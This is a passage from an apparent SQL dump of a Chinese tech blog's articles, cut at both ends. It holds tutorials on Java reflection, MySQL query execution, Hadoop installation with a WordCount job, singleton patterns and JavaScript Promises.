\");\n&nbsp;&nbsp;&nbsp;&nbsp;str.append(c.getSimpleName());\n&nbsp;&nbsp;&nbsp;&nbsp;str.append(\"{\\n\");\n&nbsp;&nbsp;&nbsp;&nbsp;Field[] fields = c.getDeclaredFields();\n&nbsp;&nbsp;&nbsp;&nbsp;// 获取成员变量\n&nbsp;&nbsp;&nbsp;&nbsp;for (Field field : fields) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\"&nbsp;\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(Modifier.toString(field.getModifiers()));\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\" \");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(field.getType().getSimpleName());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\" \");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(field.getName()).append(\"\\n\");\n&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;// 获取构造方法\n&nbsp;&nbsp;&nbsp;&nbsp;Constructor&lt;?&gt;[] constructors = c.getDeclaredConstructors();\n&nbsp;&nbsp;&nbsp;&nbsp;for (Constructor&lt;?&gt; constructor : constructors) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\"&nbsp;\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(Modifier.toString(constructor.getModifiers()));\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\" \");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(constructor.getName());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\"(\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 获取有参构造器的形式参数\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class&lt;?&gt;[] parameters = constructor.getParameterTypes();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (int i = 0; i &lt; parameters.length; i++) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class&lt;?&gt; parameter = parameters[i];\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (i == parameters.length - 1) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(parameter.getSimpleName());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(parameter.getSimpleName()).append(\",\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\")\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\"{}\\n\");\n&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;Method[] methods = c.getDeclaredMethods();\n&nbsp;&nbsp;&nbsp;&nbsp;// 获取方法\n&nbsp;&nbsp;&nbsp;&nbsp;for (Method method : methods) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\"&nbsp;\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(Modifier.toString(method.getModifiers()));\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\" \");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(method.getReturnType().getSimpleName());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\" \");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(method.getName());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\"(\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;// 获取形参\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class&lt;?&gt;[] parameters = method.getParameterTypes();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (int i = 0; i &lt; parameters.length; i++) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Class&lt;?&gt; parameter = parameters[i];\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if (i == parameters.length - 1) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(parameter.getSimpleName());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(parameter.getSimpleName()).append(\",\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str.append(\"){}\\n\");\n&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;str.append(\"}\");\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(str);\n&nbsp;}\n}\n</pre><p><br></p>',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk7T2AVzktAAjlVmip6Z8013.png',2,0,'220226DP09K1F0SW','反射获取Class类型对象的三种方式Properties类通过反射创建对象读取Properties属性文件反射创建对象User类Field获取指定的成员变量Method获取指定的方法Constructor获取指定的构造方法父类父接口通过反射反编译某个类反射获取Class类型对象的三种方式Class.forName(StringclassName);className：全限定类名全限定类名.clas',0,0,0,NULL,0,0,'2022-03-27 06:25:18','2022-04-24 06:25:18','[\"220329D180W7F2RP\"]',NULL),('220424A8P039F614','基础架构：一条SQL查询语句是如何执行的','<p><span class=\"ql-font-monospace\"><img src=\"https://cdn.qingweico.cn/blog/0d2070e8f84c4801adbfa03bda1f98d9.png\" alt=\"img\"></span></p><p>MySQL 可以分为 Server 层和存储引擎层两部分</p><p>Server 层包括连接器、查询缓存、分析器、优化器、执行器等, 涵盖 MySQL 的大多数核心服务功能, 以及所有的内置函数(如日期、时间、数学和加密函数等), 所有跨存储引擎的功能都在这一层实现, 比如存储过程、触发器、视图等</p><p>InnoDB, 从 MySQL 5.5.5 版本开始成为了默认存储引擎</p><p>在 create table 语句中使用 engine=memory, 来指定使用内存引擎创建表; 不同存储引擎的表数据存取方式不同, 支持的功能也不同</p><h3>连接器</h3><p>接器负责跟客户端建立连接、获取权限、维持和管理连接</p><pre class=\"ql-syntax\" spellcheck=\"false\">mysql -h$ip -P$port -u$user -p\n</pre><p>连接命令中的 mysql 是客户端工具, 用来跟服务端建立连接; 在完成经典的 TCP 握手后, 连接器就要开始认证你的身份, 这个时候用的就是你输入的用户名和密码</p><ul><li>如果用户名或密码不对, 你就会收到一个\"Access denied for user\"的错误, 然后客户端程序结束执行; </li><li>如果用户名密码认证通过, 连接器会到权限表里面查出你拥有的权限; 之后, 这个连接里面的权限判断逻辑, 都将依赖于此时读到的权限</li></ul><p>一个用户成功建立连接后, 即使你用管理员账号对这个用户的权限做了修改, 也不会影响已经存在连接的权限; 修改完成后, 只有再新建的连接才会使用新的权限设置</p><p>连接完成后, 如果你没有后续的动作, 这个连接就处于空闲状态, 你可以在<code style=\"background-color: rgb(243, 244, 244);\">show processlist</code>命令中看到它</p><p>客户端如果太长时间没动静, 连接器就会自动将它断开; 这个时间是由参数<code style=\"background-color: rgb(243, 244, 244);\">wait_timeout</code> 控制的, 默认值是 8 小时</p><p>数据库里面, 长连接是指连接成功后, 如果客户端持续有请求, 则一直使用同一个连接; 短连接则是指每次执行完很少的几次查询就断开连接, 下次查询再重新建立一个</p><p>建立连接的过程通常是比较复杂的, 所以我建议你在使用中要尽量减少建立连接的动作, 也就是尽量使用长连接</p><p>全部使用长连接后, 你可能会发现, 有些时候 MySQL 占用内存涨得特别快, 这是因为 MySQL 在执行过程中临时使用的内存是管理在连接对象里面的; 这些资源会在连接断开的时候才释放</p><ul><li>定期断开长连接; 使用一段时间, 或者程序里面判断执行过一个占用内存的大查询后, 断开连接, 之后要查询再重连</li><li>果你用的是 MySQL 5.7 或更新版本, 可以在每次执行一个比较大的操作后, 通过执行 mysql_reset_connection 来重新初始化连接资源; 这个过程不需要重连和重新做权限验证, 但是会将连接恢复到刚刚创建完时的状态</li></ul><h3>查询缓存</h3><p>查询缓存的失效非常频繁, 只要有对一个表的更新, 这个表上所有的查询缓存都会被清空</p><p>除非你的业务就是有一张静态表, 很长时间才会更新一次; 比如, 一个系统配置表, 那这张表上的查询才适合使用查询缓存</p><p>MySQL 8.0 版本直接将查询缓存的整块功能删掉了, 也就是说 8.0 开始彻底没有这个功能了</p><h3>分析器</h3><p>分析器先会做“词法分析”, 你输入的是由多个字符串和空格组成的一条 SQL 语句, MySQL 需要识别出里面的字符串分别是什么, 代表什么 </p><p>“语法分析”; 根据词法分析的结果, 语法分析器会根据语法规则, 判断你输入的这个 SQL 语句是否满足 MySQL 语法</p><h3>优化器</h3><p>优化器是在表里面有多个索引的时候, 决定使用哪个索引；或者在一个语句有多表关联(join)的时候, 决定各个表的连接顺序</p><p>优化器阶段完成后, 这个语句的执行方案就确定下来了, 然后进入执行器阶段</p><h3>执行器</h3><p>开始执行的时候, 要先判断一下你对这个表 T 有没有执行查询的权限, 如果没有, 就会返回没有权限的错误</p><p>权限验证不仅仅在执行器这部分会做, 在分析器之后, 也就是知道了该语句要“干什么”之后, 也会先做一次权限验证; 叫做precheck; 而precheck是无法对运行时涉及到的表进行权限验证的, 比如使用了触发器的情况; 因此在执行器这里也要做一次执行时的权限验证</p><p>如果有权限, 就打开表继续执行; 打开表的时候, 执行器就会根据表的引擎定义, 去使用这个引擎提供的接口</p><p>数据库的慢查询日志中看到一个 rows_examined 的字段, 表示这个语句执行过程中扫描了多少行; 这个值就是在执行器每次调用引擎获取数据行的时候累加的</p><p>执行器调用一次, 在引擎内部则扫描了多行, 因此引擎扫描行数跟 rows_examined 并不是完全相同的</p>',7,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJk7ZiAK07GAAA1Jtkfplc01.jpeg',2,0,'220226DP09K1F0SW','MySQL可以分为Server层和存储引擎层两部分Server层包括连接器、查询缓存、分析器、优化器、执行器等,涵盖MySQL的大多数核心服务功能,以及所有的内置函数(如日期、时间、数学和加密函数等),所有跨存储引擎的功能都在这一层实现,比如存储过程、触发器、视图等InnoDB,从MySQL5.5.5版本开始成为了默认存储引擎在createtable语句中使用engine=memory,来指定使用',0,0,0,NULL,0,0,'2022-01-28 06:26:52','2022-04-24 06:26:52','[\"220329D4W4C5AH4H\"]',NULL),('220516A5NMFBPMY8','5月16日','<p>5月16日</p>',12,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWKB7HiASPkjAA8ad5e6ow8952.jpg',3,0,'220226DP09K1F0SW','5月16日',0,0,0,NULL,0,0,'2022-05-16 14:17:49','2022-05-16 14:17:49','[\"220329D53S7A6XYW\",\"220329D57ZCM5R8H\"]',NULL),('220517BSH96XMT9P','hadoop的安装','<p><strong style=\"color: rgb(65, 131, 196);\">hadoop的安装</strong></p><p><span style=\"color: rgb(65, 131, 196);\">环境配置</span></p><p><span style=\"color: rgb(65, 131, 196);\">使用MapReduce进行WordCount统计</span></p><pre class=\"ql-syntax\" spellcheck=\"false\"># 下载hadoop至/opt\nwget https://archive.apache.org/dist/hadoop/common/hadoop-3.1.4/hadoop-3.1.4.tar.gz\n</pre><h2>环境配置</h2><pre class=\"ql-syntax\" spellcheck=\"false\">$hadoop/sbin/start-dfs.hs\nHDFS_DATANODE_USER=root\nHADOOP_DATANODE_SECURE_USER=hdfs\nHDFS_NAMENODE_USER=root\nHDFS_SECONDARYNAMENODE_USER=root\n$hadoop/sbin/stop-dfs.hs\nHDFS_DATANODE_USER=root\nHADOOP_DATANODE_SECURE_USER=hdfs\nHDFS_NAMENODE_USER=root\nHDFS_SECONDARYNAMENODE_USER=root\n</pre><h2>使用MapReduce进行WordCount统计</h2><pre class=\"ql-syntax\" spellcheck=\"false\">package cn.qingweico;\n​\nimport org.apache.hadoop.conf.Configuration;\nimport org.apache.hadoop.fs.Path;\nimport org.apache.hadoop.io.IntWritable;\nimport org.apache.hadoop.io.Text;\nimport org.apache.hadoop.mapreduce.Job;\nimport org.apache.hadoop.mapreduce.Mapper;\nimport org.apache.hadoop.mapreduce.Reducer;\nimport org.apache.hadoop.mapreduce.lib.input.FileInputFormat;\nimport org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;\nimport org.apache.hadoop.util.GenericOptionsParser;\n​\nimport java.io.IOException;\nimport java.util.Iterator;\nimport java.util.StringTokenizer;\n​\n​\n/**\n * @author zqw\n * @date 2021/6/13\n */\npublic class WordCount {\n​\n&nbsp;&nbsp;private static final int MAX_ARGS = 2;\n&nbsp;&nbsp;public WordCount() {\n&nbsp;}\n​\n&nbsp;&nbsp;public static void main(String[] args) throws Exception {\n&nbsp;&nbsp;&nbsp;&nbsp;Configuration conf = new Configuration();\n&nbsp;&nbsp;&nbsp;&nbsp;String[] otherArgs = (new GenericOptionsParser(conf, args)).getRemainingArgs();\n&nbsp;&nbsp;&nbsp;&nbsp;if (otherArgs.length &lt; MAX_ARGS) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.err.println(\"Usage: wordCount &lt;in&gt; [&lt;in&gt;...] &lt;out&gt;\");\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.exit(-1);\n&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;long start = System.currentTimeMillis();\n&nbsp;&nbsp;&nbsp;&nbsp;Job job = Job.getInstance(conf, \"word count\");\n&nbsp;&nbsp;&nbsp;&nbsp;job.setJarByClass(WordCount.class);\n&nbsp;&nbsp;&nbsp;&nbsp;job.setMapperClass(WordCount.TokenizerMapper.class);\n&nbsp;&nbsp;&nbsp;&nbsp;job.setCombinerClass(WordCount.IntSumReducer.class);\n&nbsp;&nbsp;&nbsp;&nbsp;job.setReducerClass(WordCount.IntSumReducer.class);\n&nbsp;&nbsp;&nbsp;&nbsp;job.setOutputKeyClass(Text.class);\n&nbsp;&nbsp;&nbsp;&nbsp;job.setOutputValueClass(IntWritable.class);\n&nbsp;&nbsp;&nbsp;&nbsp;for (int i = 0; i &lt; otherArgs.length - 1; ++i) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FileInputFormat.addInputPath(job, new Path(otherArgs[i]));\n&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;FileOutputFormat.setOutputPath(job, new Path(otherArgs[otherArgs.length - 1]));\n&nbsp;&nbsp;&nbsp;&nbsp;long end = System.currentTimeMillis();\n&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(\"Spend time total:\" + (end - start) + \"ms\");\n&nbsp;&nbsp;&nbsp;&nbsp;System.exit(job.waitForCompletion(true) ? 0 : 1);\n&nbsp;}\n​\n&nbsp;&nbsp;public static class TokenizerMapper extends Mapper&lt;Object, Text, Text, IntWritable&gt; {\n&nbsp;&nbsp;&nbsp;&nbsp;private static final IntWritable ONE = new IntWritable(1);\n&nbsp;&nbsp;&nbsp;&nbsp;private final Text word = new Text();\n​\n&nbsp;&nbsp;&nbsp;&nbsp;public TokenizerMapper() {\n&nbsp;&nbsp;&nbsp;}\n​\n&nbsp;&nbsp;&nbsp;&nbsp;@Override\n&nbsp;&nbsp;&nbsp;&nbsp;public void map(Object key, Text value, Mapper&lt;Object, Text, Text, IntWritable&gt;.Context context) throws InterruptedException, IOException {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;StringTokenizer itr = new StringTokenizer(value.toString());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while (itr.hasMoreTokens()) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.word.set(itr.nextToken());\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;context.write(this.word, ONE);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;}\n&nbsp;}\n​\n&nbsp;&nbsp;public static class IntSumReducer extends Reducer&lt;Text, IntWritable, Text, IntWritable&gt; {\n&nbsp;&nbsp;&nbsp;&nbsp;private final IntWritable result = new IntWritable();\n​\n&nbsp;&nbsp;&nbsp;&nbsp;public IntSumReducer() {\n&nbsp;&nbsp;&nbsp;}\n​\n&nbsp;&nbsp;&nbsp;&nbsp;@Override\n&nbsp;&nbsp;&nbsp;&nbsp;public void reduce(Text key, Iterable&lt;IntWritable&gt; values, Reducer&lt;Text, IntWritable, Text, IntWritable&gt;.Context context) throws IOException, InterruptedException {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;int sum = 0;\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IntWritable val;\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for (Iterator&lt;IntWritable&gt; i = values.iterator(); i.hasNext(); sum += val.get()) {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;val = i.next();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;this.result.set(sum);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;context.write(key, this.result);\n&nbsp;&nbsp;&nbsp;}\n&nbsp;}\n}\n​\n# 启动hdfs和yarn\n# $hadoop\ncd sbin\n./start-dfs.sh\n./start-yarn.sh\n# 将WordCount打包(jar)至($hadoop)exec文件夹下\n# 新建hdfs文件夹\nbin/hdfs dfs -mkdir /user\nbin/hdfs dfs -mkdir /user/root\nbin/hdfs dfs -mkdir /user/root/input\n# 将需统计的文本文件上传至hdfs\nbin/hdfs dfs -put 1M-Word.txt /user/root/input\n# 执行jar\nbin/hadoop jar exec/WordCount.jar /user/root/input/1M-Word.txt ouput\n# 查看执行结果\nbin/hdfs dfs -cat /user/root/ouput/part-r-00000\n# 或者将hfs中的文件复制到本地\nbin/hdfs dfs -get /user/root/ouput ouput\n</pre><p><br></p>',2,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWKDXXKAVC8-AABohcju5CA49.jpeg',2,0,'220226DP09K1F0SW','hadoop的安装环境配置使用MapReduce进行WordCount统计#下载hadoop至/opt wgethttps://archive.apache.org/dist/hadoop/common/hadoop-3.1.4/hadoop-3.1.4.tar.gz 环境配置$hadoop/sbin/start-dfs.hs HDFS_DATANODE_USER=root HADOOP_DATA',0,0,0,NULL,0,0,'2022-05-17 16:32:35','2022-05-17 16:32:35','[\"220517BSH96XMT9R\",\"220329D4N9GNBDKP\"]',NULL),('220517BW92FCZ06W','单例模式','<h1>目录</h1><p><strong style=\"color: rgb(65, 131, 196);\">目录</strong></p><p><span style=\"color: rgb(65, 131, 196);\">单例模式:保证在内存中只有一个对象</span></p><p><span style=\"color: rgb(65, 131, 196);\">如何保证类中只有一个对象呢？</span></p><p><span style=\"color: rgb(65, 131, 196);\">懒汉模式</span></p><p><span style=\"color: rgb(65, 131, 196);\">饿汉模式</span></p><p><span style=\"color: rgb(65, 131, 196);\">在多线程环境下使用饿汉模式会带来的问题</span></p><p><span style=\"color: rgb(65, 131, 196);\">解决</span></p><p><span style=\"color: rgb(65, 131, 196);\">静态内部类实现单例模式</span></p><h2>单例模式:保证在内存中只有一个对象</h2><h3>如何保证类中只有一个对象呢？</h3><ul><li>让外界不能创建对象              <strong><em>构造私有</em></strong></li><li>本身提供一个对象                  <strong>在类中创建好对象 </strong></li><li>对外提供公共的访问公式      <strong>写一个公共的方法 </strong></li></ul><h3>懒汉模式</h3><pre class=\"ql-syntax\" spellcheck=\"false\">//懒汉式单例模式 直接将对象在类中创建好\npublic class Student {\n&nbsp;&nbsp;//构造私有\n&nbsp;&nbsp;private Student(){}\n&nbsp;&nbsp;//静态只能访问静态,加static\n&nbsp;&nbsp;//为了不让外界访问,加private\n&nbsp;&nbsp;private static Student student = new Student();//使用静态变量\n&nbsp;&nbsp;//提供公共访问\n&nbsp;&nbsp;//为了让外界可以访问,加static\n&nbsp;&nbsp;public static Student getStudent(){\n&nbsp;&nbsp;&nbsp;&nbsp;return student;\n&nbsp;}\n}\npublic class Student {\n&nbsp;&nbsp;private Student(){}\n&nbsp;&nbsp;private static Student student;\n&nbsp;&nbsp;static{\n&nbsp;&nbsp;&nbsp;&nbsp;student = new Student(); //使用静态代码块\n&nbsp;}\n&nbsp;&nbsp;public static Student getStudent(){\n&nbsp;&nbsp;&nbsp;&nbsp;return student;\n&nbsp;}\n}\n</pre><p>饿汉模式在类加载初始化阶段就完成了实例的初始化。本质是JVM的类加载机制保证了实例的唯一性</p><p>类加载过程:</p><ul><li>加载二进制数据到内存中,生成对应的Class数据结构</li><li>连接  验证  准备(给类的静态成员变量赋默认值) 解析</li><li>初始化  给类的静态成员变量赋值</li></ul><p>只有真正使用类时才会触发类的初始化（比如当使用new 操作,访问类的静态方法或者静态属性以及使用反射访问类 初始化一个类的子类等等）</p><p>上述实际过程:当第一次使用Student调用静态方法getStudent时,内存中并不存在Student类,所以发生类加载即将Student加载到内存中,完成初始化即给静态变量赋值完成对象的创建。而类加载只会发生一次,从而保证对象的唯一性。</p><h3>饿汉模式</h3><pre class=\"ql-syntax\" spellcheck=\"false\">// 饿汉式单例模式 用到对象时才创建对象 会引起线程安全问题\npublic class Student {\n&nbsp;&nbsp;private Student(){}\n&nbsp;&nbsp;private static Student student = null;\n&nbsp;&nbsp;public&nbsp;static Student getStudent(){\n&nbsp;&nbsp;&nbsp;&nbsp;if(student == null){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;student = new Student();\n&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;student;\n&nbsp;}\n}\n</pre><h4>在多线程环境下使用饿汉模式会带来的问题</h4><pre class=\"ql-syntax\" spellcheck=\"false\">package design;\npublic class Student {\n&nbsp;&nbsp;private Student(){}\n&nbsp;&nbsp;private static Student student = null;\n&nbsp;&nbsp;public static Student getStudent(){\n&nbsp;&nbsp;&nbsp;&nbsp;if(student == null){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try {\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thread.sleep(1000);\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}catch (InterruptedException e){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;e.printStackTrace();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;student = new Student();\n&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;return student;\n&nbsp;}\n&nbsp;&nbsp;public static void main(String[] args){\n&nbsp;&nbsp;&nbsp;&nbsp;new Thread(()-&gt;{\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Student student1 = Student.getStudent();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(student1);\n&nbsp;&nbsp;&nbsp;}).start();\n&nbsp;&nbsp;&nbsp;&nbsp;new Thread(()-&gt;{\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Student student2 = Student.getStudent();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;System.out.println(student2);\n&nbsp;&nbsp;&nbsp;}).start();\n&nbsp;}\n}\n</pre><p>当不同的线程判断student对象为空时会执行getStudent方法,创建各自的student对象返回</p><h4>解决</h4><ul><li>最简单的方法是同步方法即getStudent方法加synchronized关键字修饰,但会影响性能</li><li>同步代码块  使用双重检查机制(DCL)  但是可能会发生字节码指令重排序(初始化和引用赋值交换顺序)会造成空指针异常</li><li class=\"ql-indent-1\">分配对象的内存空间  A</li><li class=\"ql-indent-1\">初始化对象 B</li><li class=\"ql-indent-1\">设置实例指向刚分配的内存地址 C</li><li class=\"ql-indent-1\">若步骤B和C交换 单线程下没有问题 但是多线程下  则会有线程判断instance不为空返回未初始化完成的对象</li><li>在上面的过程中只需在可能会发生字节码指令重排序的堆空间所对应的引用加上关键字volatile修饰即可</li></ul><pre class=\"ql-syntax\" spellcheck=\"false\">package design;\npublic class Student {\n&nbsp;&nbsp;private Student(){}\n&nbsp;&nbsp;private volatile static Student student = null;\n&nbsp;&nbsp;public static Student getStudent(){\n&nbsp;&nbsp;&nbsp;&nbsp;if(student == null){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;synchronized (Student.class){\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(student == null){ \n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;student = new Student();\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;}\n&nbsp;&nbsp;&nbsp;&nbsp;return student;\n}\n</pre><p>字节码层面:</p><ul><li>分配空间</li><li>初始化</li><li>引用赋值</li></ul><h3>静态内部类实现单例模式</h3><pre class=\"ql-syntax\" spellcheck=\"false\">package design;\npublic class Student {\n&nbsp;&nbsp;private Student(){}\n&nbsp;&nbsp;private static class Inner{\n&nbsp;&nbsp;&nbsp;&nbsp;private static Student student = new Student();\n&nbsp;}\n&nbsp;&nbsp;public static Student getStudent(){\n&nbsp;&nbsp;&nbsp;&nbsp;return Inner.student;\n&nbsp;}\n&nbsp;&nbsp;public static void main(String[] args){\n&nbsp;&nbsp;&nbsp;&nbsp;Student student = Student.getStudent();\n&nbsp;}\n}\n</pre><p>本质也是使用JVM的类加载机制保证线程安全,并且是懒加载模式的一种且线程安全,当用到时才会触发类的初始化</p><p>过程: 当Student调用getStudent方法时发生类加载机制,将Student类加载到内存中,完成静态变量的赋值操作等等,但是不会完成内部类的初始化,当getStudent方法返回Inner.student时,JVM就会在内存中检查是否具有Inner类型的数据,此时会发生类加载即将Inner类加载到内存中,完成静态变量的初始化即创建student对象</p>',5,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWKDXtqABVwAAA8ad5e6ow8761.jpg',2,0,'220226DP09K1F0SW','目录目录单例模式:保证在内存中只有一个对象如何保证类中只有一个对象呢？懒汉模式饿汉模式在多线程环境下使用饿汉模式会带来的问题解决静态内部类实现单例模式单例模式:保证在内存中只有一个对象如何保证类中只有一个对象呢？让外界不能创建对象构造私有本身提供一个对象在类中创建好对象对外提供公共的访问公式写一个公共的方法懒汉模式//懒汉式单例模式直接将对象在类中创建好 publicclassStudent{ &',0,0,0,NULL,0,0,'2022-05-17 16:37:48','2022-05-17 16:37:48','[\"220329D180W7F2RP\"]',NULL),('220517BWRZ2S8ZC0','Promise','<h1>Promise</h1><p><strong style=\"color: rgb(65, 131, 196);\">Promise</strong></p><p><span style=\"color: rgb(65, 131, 196);\">任务队列和事件循环</span></p><p><span style=\"color: rgb(65, 131, 196);\">异步操作的基本流程控制</span></p><p><span style=\"color: rgb(65, 131, 196);\">嵌套回调</span></p><p><span style=\"color: rgb(65, 131, 196);\">串行执行</span></p><p><span style=\"color: rgb(65, 131, 196);\">并行执行</span></p><p><span style=\"color: rgb(65, 131, 196);\">并行与串行的结合</span></p><p><span style=\"color: rgb(65, 131, 196);\">定时器</span></p><p><span style=\"color: rgb(65, 131, 196);\">setTimeout()</span></p><p><span style=\"color: rgb(65, 131, 196);\">sleep() 函数</span></p><p><span style=\"color: rgb(65, 131, 196);\">promise</span></p><h2>任务队列和事件循环</h2><pre class=\"ql-syntax\" spellcheck=\"false\">首先js只在一个线程上运行(主线程), 但不代表js只有一个线程, 而js引擎有多个线程, 其他线程都是在后台配合; js内部采用事件循环机制(Event Loop); js在运行时除了一个正在运行的主线程, js引擎还提供了一个任务队列(task queue), 里面放着各种需要当前程序处理的异步任务(其实根据异步任务的类型, 存在多个任务队列, 为了方便理解, 这里只存在一个任务队列), js会去执行所有的同步任务,等到全部的同步任务全部执行完,就会去看任务队列里的异步任务,而如果有满足的异步任务, 那么该异步任务就会进入主线程, 成为同步任务, 执行完后, 下一个异步任务再进入主线程开始执行, 一但任务队列清空,那么该程序也就结束了\n</pre><h2>异步操作的基本流程控制</h2><h3>嵌套回调</h3><pre class=\"ql-syntax\" spellcheck=\"false\">/*六个回调函数的嵌套, 一共需要花费6s, 不仅写起来麻烦, 还容易出错, 还难以维护*/\nfunction async(args, callback){\n&nbsp;&nbsp;console.log(\"参数为\" + args + \" 1秒后返回\");\n&nbsp;&nbsp;setTimeout(function(){callback(args*2);},1000);\n}\nfunction final(value){\n&nbsp;&nbsp;console.log(\"完成 \",value);\n}\nasync(1,function(value){\n&nbsp;&nbsp;async(2,function(value){\n&nbsp;&nbsp;&nbsp;&nbsp;async(3,function(value) 